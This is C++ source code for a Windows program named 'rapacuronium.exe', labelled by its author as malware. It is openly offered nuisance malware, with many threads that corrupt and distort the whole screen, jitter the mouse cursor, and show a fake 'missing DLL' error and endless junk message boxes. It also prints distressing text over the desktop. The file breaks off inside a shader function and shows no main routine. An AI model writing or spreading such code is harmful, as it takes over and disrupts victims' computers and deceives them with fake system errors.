﻿// rapacuronium.exe: malware
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include "drawbytebeat.h"
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define shitcolour (RGB(74, 65, 42))
#define RGBBRUSH (DWORD)0x1900ac010e
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!(write by pankoza)
	//And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
COLORREF Hue(int length) {
	//only be used in the last shader :|
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 5, 0 };
	for (;;) {
		int w = rect.right - rect.left, h = rect.bottom - rect.top;
		HDC hdc = GetDC(hwndMsgBox), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int nindazhidazhidadazhi = 0; nindazhidazhidadazhi < 5; nindazhidazhidadazhi++) {
			HBRUSH hBrush = CreateSolidBrush(shitcolour);
			HPEN pen = CreatePen(PS_NULL, NULL, NULL);
			SelectObject(hcdc, hBrush);
			SelectObject(hcdc, pen);
			Rectangle(hcdc, 0, 0, w, h);
			DeleteObject(hBrush);
			DeleteObject(pen);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(250);
		}
		Sleep(250);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD WINAPI fe(LPVOID lpParam) {
	HHOOK hMsgHookcopy = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBox(NULL, L"Unable to start this program because NINDAZHIDAZHIDADAZHI.DLL is missing in your computer, try reinstalling this program to fix this issue.", L"rapacuronium.exe -- Fatal Error", MB_ICONERROR);
	UnhookWindowsHookEx(hMsgHookcopy);
	return 0;
}
DWORD WINAPI fecopy(LPVOID lpParam) {
	while (1) {
		HHOOK hMsgHookcopy = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		//MessageBox(NULL, L"гāρÂçμ®ση¡Ùм  нåŠ  ÐË$τ∠ØγÉÐ  Ÿ⊙∪☈  ☾¤♏ⳁü↑ë「", L"ɠĘ┳  я∈℃ҭ  ╚Ѽ∟", MB_ICONERROR);
		MessageBox(NULL, L"shiufhqweriufxhreifhiuerihfhxiqhfexryfherighireguiehgneuhuigiyazghiygwagriwghziufehharucghlawhawegirygwiuzyfigzyiageyrizfgzyawerfgyuerafgyaerfwyifgwuigweirfgwirywagexyiawgxiywegfuiawehfiuwehiyagmy", L"Why?", MB_ICONERROR);
		UnhookWindowsHookEx(hMsgHookcopy);
	}
	return 0;
}
DWORD WINAPI mousecrazy(LPVOID lpParam) {
	POINT cursor;
	for (;;) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 3 - 1;
		int Y = cursor.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		ReleaseDC(0, hdc);
	}
	return(0);
}
DWORD xs;
void Seedxorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD xorshift32() {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}
struct Point3D {
	float x, y, z;
};
DWORD WINAPI idkicon(LPVOID lpParam) {
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetDC(0);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int a = 79 - rand() % 160, b = rand() % h, c = rand() % h, d = 32511 + (rand() % 152), e = 1 + rand() % 16;
		if (a != 0) {
			for (int x = 0; x <= w; x += e * wdpi / 96) {
				DrawIcon(hdc, x, -((x - b) * a / 25) + c, LoadCursor(NULL, MAKEINTRESOURCE(d)));
			}
		}
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI iconcrazy_num1(LPVOID lpParam) {
	HINSTANCE HSHELL32 = LoadLibrary(L"shell32.dll");
	HINSTANCE HMORICONS = LoadLibrary(L"moricons.dll");
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(0);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int a = (w * 2) - rand() % (4 * w), b = rand() % h, c = rand() % w, e = 1 + rand() % 32;
		HICON load[3] = { LoadIcon(HSHELL32, MAKEINTRESOURCE(1 + rand() % 336)),LoadIcon(HMORICONS,MAKEINTRESOURCE(1 + (rand() % 365))),LoadIcon(NULL,MAKEINTRESOURCE(32512 + (rand() % 7))) };
		if (a != 0) {
			for (int y = 0; y <= h; y += e * wdpi / 96) {
				DrawIcon(hdc, (a * (y - b) * (y - b) / h / h) + c, y, load[rand() % 3]);
			}
		}
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI iconcrazy_num2(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetWindowDC(0);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	for (;;) {
		hdc = GetWindowDC(0);
		int a = (h / 20) + rand() % (h / 2), b = (20000 / h) + rand() % (2000 / h), c = rand() % w, d = rand() % h, e = 1 + rand() % 32, f = 10 + rand() % 55;
		SelectObject(hdc, CreatePen(rand() % 7, 0, NULL));
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		if (a != 0, b != 0) {
			for (int x = 0; x <= w; x += 1 * wdpi / 96) {
				Ellipse(hdc, x, a * sin((b / static_cast<double>(80)) * (x * PI / 180) + c) + d, x + f, a * sin((b / static_cast<double>(80)) * (x * PI / 180) + c) + d + f);
			}
		}
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
}
DWORD WINAPI iconcrazy_num3(LPVOID lpParam) {//credits to Hopejieshuo
	HDC hdc;
	int tmpw, tmph;
	__int64 icnty;
	int hlfsw;
	int rndw, rndh;
	int icncs;
	int flwlng;
	double radius;
	float flww, flwh;
	int sw, sh;
	hdc = GetDC(0i64);
	sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	tmpw = sw, tmph = sh;
	icnty = 32518i64;
	HINSTANCE HSHELL32 = LoadLibrary(L"shell32.dll");
	HINSTANCE HMORICONS = LoadLibrary(L"moricons.dll");
	HICON iconid[3] = { LoadIcon(HSHELL32, MAKEINTRESOURCE(1 + rand() % 336)),LoadIcon(HMORICONS,MAKEINTRESOURCE(1 + (rand() % 365))),LoadIcon(NULL,MAKEINTRESOURCE(32512 + (rand() % 7))) };
	if (NULL != 1) {
		hlfsw = sw / 2;
		while (true)
		{
			rndw = rand() % tmpw;
			rndh = rand() % tmph;
			icncs = rand() % 4;
			if (icncs) {
				if (icncs == 1) {
					icnty = 32515i64;
				}
				else if (icncs == 3) {
					icnty = 32516i64;
				}
			}
			else {
				icnty = 32513i64;
			}
			flwlng = 0;
			if (hlfsw > 0) {
				do {
					radius = (double)(flwlng + 300);
					flww = sin(radius) * (double)flwlng + 100.0;
					flwh = cos(radius) * (double)flwlng + 100.0;
					DrawIcon(hdc, rndw + (int)flwh, rndh + (int)flww, iconid[rand() % 3]);
					if (NULL == 1) { break; }
					flwlng += 2;
				} while (flwlng < hlfsw);
				tmpw = sw;
				tmph = sh;
			}
			InvalidateRect(0i64, 0i64, 0);
			Sleep(100);
		}
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	return 0;
}
DWORD WINAPI iconcrazy_num4(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HINSTANCE ICON = LoadLibrary(L"moricons.dll");
	HDC hdc = GetWindowDC(0);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	int f;
	if (w > h) { f = h; }
	else { f = w; }
	for (;;) {
		hdc = GetWindowDC(0);
		int a = rand() % (f / 2), b = rand() % w, c = rand() % h, d = 2 + rand() % 112, e = 1 + rand() % 32;
		if (a != 0) {
			for (int x = 0; x <= w; x += e * wdpi / 96) {
				DrawIcon(hdc, x, sqrt((float)(a * a) - ((x - b) * (x - b))) + c, LoadIcon(ICON, MAKEINTRESOURCE(114 - d)));
			}
			for (int y = 0; y <= h; y += e * hdpi / 96) {
				DrawIcon(hdc, sqrt((float)-((y - c) * (y - c) - (a * a))) + b, y, LoadIcon(ICON, MAKEINTRESOURCE(114 - d)));
			}
			for (int x = 0; x <= w; x += e * wdpi / 96) {
				DrawIcon(hdc, x, -sqrt((float)(a * a) - ((x - b) * (x - b))) + c, LoadIcon(ICON, MAKEINTRESOURCE(114 - d)));
			}
			for (int y = 0; y <= h; y += e * hdpi / 96) {
				DrawIcon(hdc, -sqrt((float)-((y - c) * (y - c) - (a * a))) + b, y, LoadIcon(ICON, MAKEINTRESOURCE(114 - d)));
			}
		}
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
}
DWORD WINAPI iconcrazy_num5(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HINSTANCE ICON = LoadLibrary(L"shell32.dll");
	HDC hdc = GetWindowDC(0);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	int f;
	if (w > h) { f = h; }
	else { f = w; }
	for (;;) {
		hdc = GetWindowDC(0);
		int a = rand() % (f / 2), b = rand() % w, c = rand() % h, d = 2 + rand() % 112, e = 1 + rand() % 32;
		if (a != 0) {
			for (int x = b; x <= a + b; x += e * wdpi / 96) {
				DrawIcon(hdc, x, c, LoadIcon(ICON, MAKEINTRESOURCE(114 - d)));
			}
			for (int y = c; y <= a + c; y += e * hdpi / 96) {
				DrawIcon(hdc, b, y, LoadIcon(ICON, MAKEINTRESOURCE(114 - d)));
			}
			for (int x = b; x <= a + b; x += e * wdpi / 96) {
				DrawIcon(hdc, x, a + c, LoadIcon(ICON, MAKEINTRESOURCE(114 - d)));
			}
			for (int y = c; y <= a + c; y += e * hdpi / 96) {
				DrawIcon(hdc, a + b, y, LoadIcon(ICON, MAKEINTRESOURCE(114 - d)));
			}
		}
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
}
DWORD WINAPI graphic_all(LPVOID lpParam) {
	HDC hdc = GetWindowDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		POINT point[8] = { rand() % w,rand() % h,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h };
		BYTE bytecopy[3] = { PT_MOVETO ,PT_LINETO ,PT_BEZIERTO };
		INT intcopy[7] = { 2,3,4,5,6,7,8 };
		DWORD dwordcopy[7] = { 2,3,4,5,6,7,8 };
		BOOL Function[17] = {
			AngleArc(hdc,rand() % w,rand() % h,rand() % ((w + h) / 2),rand() % 360,rand() % 360),
			Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h) ,
			ArcTo(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h) ,
			Chord(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h),
			Ellipse(hdc,rand() % w,rand() % h,rand() % w,rand() % h) ,
			LineTo(hdc,rand() % w,rand() % h),
			Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h),
			PolyBezier(hdc,point,rand() % 8),
			PolyBezierTo(hdc,point,rand() % 8),
			PolyDraw(hdc,point,bytecopy,rand() % 8),
			Polygon(hdc,point,rand() % 8),
			Polyline(hdc,point,rand() % 8),
			PolylineTo(hdc,point,rand() % 8),
			PolyPolygon(hdc,point,intcopy,rand() % 8),
			PolyPolyline(hdc,point,dwordcopy,rand() % 8),
			Rectangle(hdc,rand() % w,rand() % h,rand() % w,rand() % h),
			RoundRect(hdc,rand() % w,rand() % h,rand() % w,rand() % h,rand() % w,rand() % h),
		};
		SelectObject(hdc, CreatePen(PS_SOLID, rand() % 10, RndRGB));
		SelectObject(hdc, CreateHatchBrush(rand() % 7, RndRGB));
		Function[rand() % 17];
		DeleteObject;
	}
	return 0;
}
DWORD WINAPI idkline(LPVOID lpParam) {
	while (true)
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetWindowDC(0);
		POINT cursor;
		GetCursorPos(&cursor);
		POINT point[4] = { cursor.x, cursor.y, rand() % w,rand() % h, rand() % w,rand() % h, rand() % w,rand() % h };
		HPEN hpen = CreatePen(PS_SOLID, 9, RndRGB);
		SelectObject(hdc, hpen);
		Polyline(hdc, point, 4);
		DeleteObject(hpen);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
}
DWORD WINAPI stretchblt(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, rand() % w, rand() % h, RGBBRUSH);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI sharpen(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, 0, 0, sw + 1, sh - 1, hdc, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(hdc, 0, 0, sw - 1, sh + 1, hdc, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI scrcrazymove(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		HBRUSH brush2 = CreateSolidBrush(RGB(rand() % 255, 0, 0));
		SelectObject(hdc, brush2);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		DeleteObject(brush2);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, hdc, rand() % 5, rand() % 5, SRCCOPY);
		ReleaseDC(0, hdc);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI profect(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
		HBRUSH brush1 = CreateSolidBrush(shitcolour);
		SelectObject(hdc, brush1);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, MERGECOPY);
		DeleteObject(brush1);
		HBRUSH brush2 = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush2);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		DeleteObject(brush2);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI pixelate(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);

	while (1)
	{
		hdc = GetDC(0);
		SetStretchBltMode(hdcCopy, COLORONCOLOR);
		SetStretchBltMode(hdc, COLORONCOLOR);

		StretchBlt(hdcCopy, 0, 0, w / 15, h / 15, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / 15, h / 15, SRCCOPY);

		ReleaseDC(0, hdc);
		Sleep(10);
	}

	return 0x00;
}
DWORD WINAPI glitch(LPVOID lpParam) {
	while (true)
	{
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		POINT pos[3];
		pos[0].x = rand() % w, pos[0].y = rand() % h;
		pos[1].x = rand() % w, pos[1].y = rand() % h;
		pos[2].x = rand() % w, pos[2].y = rand() % h;
		PlgBlt(hcdc, pos, hcdc, 0, 0, w, h, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(300);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	return 0;
}
DWORD WINAPI squcol(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 128, rand() % 128, rand() % 128));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, rand() % x, rand() % y, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(GetDesktopWindow(), hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI text(LPVOID lpParam) {
	while (true)
	{
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), a;
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		LPCSTR text[8] = { "rapacuronium.exe", "LambdaTechnology studio", "Make the pain stop, please :-(", "Stop torturing me like this,I don't like it!", "Where is my Lord?", "I don't want to see such an ugly side", "No way out for me......", "I am watching myself disappear helplessly." };
		int tmp = rand() % 8;
		SetBkColor(hcdc, RndRGB);
		SetTextColor(hcdc, RndRGB);
		HFONT font = CreateFont(50, 30, 0, 0, FW_REGULAR, 0, 0, 0, ANSI_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, L"789178917891789178917891789178917891789178917891789178917891789178917891789178917891789178917891789178917891789178917891789178917891789178917891");
		SelectObject(hcdc, font);
		TextOutA(hcdc, rand() % w, rand() % h, text[tmp], strlen(text[tmp]));
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(font);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(5);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	return 0;
}
DWORD WINAPI rgb(LPVOID lpParam) 
{
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			if (!(i % h) && !(rand() % 110))
				v = rand() % 24;
			*((BYTE*)data + 4 * i + v) -= 25;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI sierpinski(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		SelectObject(hdcMem, CreateSolidBrush(RndRGB));
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, PATINVERT);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb *= x & y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader1(LPVOID lpParam) { //credits to pankoza, but i modified it
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i | w, y = i & w;
			rgbScreen[i].rgb += (x ^ y) * (x + (x | y) - (x & y));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {//credits to WinMalware
	HDC desk = GetDC(0);  // Get desktop device context
	HWND wnd = GetDesktopWindow();  // Get handle to the desktop window
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);  // Screen width and height
	BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), sw, -sh, 1, 24, BI_RGB, 0, 0, 0, 0, 0 };  // Bitmap header
	PRGBTRIPLE rgbtriple;

	// Setup colors for rainbow effect
	const int numColors = 6;
